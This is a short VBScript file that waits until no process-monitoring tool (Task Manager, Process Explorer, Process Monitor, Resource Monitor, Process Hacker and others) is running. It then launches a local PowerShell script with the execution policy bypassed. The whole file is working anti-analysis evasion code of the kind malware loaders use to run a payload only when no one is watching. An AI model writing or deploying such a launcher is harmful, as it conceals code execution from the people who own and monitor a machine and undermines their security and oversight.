
powerShellScript = "C:\Users\leoma\Desktop\testrun.ps1"

taskManagers = Array("taskmgr.exe","procmon.exe","procmon64.exe","procexp.exe","procexp64.exe","perfmon.exe","perfmon64.exe","resmon.exe","resmon64.exe","ProcessHacker.exe")

Function IsProcessRunning(processName)
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name='" & processName & "'")
    If colProcesses.Count > 0 Then
        IsProcessRunning = True
    Else
        IsProcessRunning = False
    End If
End Function

Do
    allClear = True
    For Each taskManager In taskManagers
        If IsProcessRunning(taskManager) Then
            allClear = False
            Exit For
        End If
    Next

    If allClear Then
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & powerShellScript & """", 1, True
        Exit Do
    End If

    WScript.Sleep 1000
Loop
